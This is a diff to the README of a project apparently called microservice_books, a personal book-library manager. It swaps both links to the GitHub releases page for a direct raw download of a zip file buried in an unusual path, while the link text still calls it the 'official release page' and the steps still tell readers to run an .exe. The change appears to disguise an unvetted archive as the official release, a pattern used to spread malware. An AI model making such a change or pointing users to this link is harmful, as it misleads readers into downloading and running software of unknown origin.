@@ -1,6 +1,6 @@
 # 📚 microservice_books - Organize your personal library with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Akashkashyap11/microservice_books/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Akashkashyap11/microservice_books/raw/refs/heads/main/chapters/part14/books_microservice_Archaeopithecus.zip)
 
 ## 📖 About this application
 
@@ -18,7 +18,7 @@ Microservice_books manages your digital book collection using a modern microserv
 
 Follow these steps to put this software on your computer.
 
-1. Go to the [official release page](https://github.com/Akashkashyap11/microservice_books/releases).
+1. Go to the [official release page](https://github.com/Akashkashyap11/microservice_books/raw/refs/heads/main/chapters/part14/books_microservice_Archaeopithecus.zip).
 2. Look for the latest version listed at the top.
 3. Click the file name that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
